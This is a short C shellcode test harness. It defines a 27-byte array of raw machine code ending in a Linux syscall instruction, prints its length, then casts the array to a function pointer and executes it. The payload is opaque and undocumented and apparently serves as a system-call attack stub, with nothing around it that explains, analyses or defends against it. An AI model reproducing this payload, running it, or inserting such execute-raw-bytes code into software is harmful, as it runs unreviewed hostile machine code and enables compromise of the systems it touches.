#include<stdio.h>
#include<string.h>
 
 
unsigned char code[] = \
"\x04\xa9\xbf\x56\xef\x70\x7f\x48\xd1\xe7\xff\xc7\xba\x69\x19\x12\x28\xbe\xdc\xfe\x21\x43\x48\x87\xd6\x0f\x05";

main()
{
 
printf("Shellcode Length:  %d\n", (int)strlen(code));
 
int (*ret)() = (int(*)())code;
 
ret();
 
}
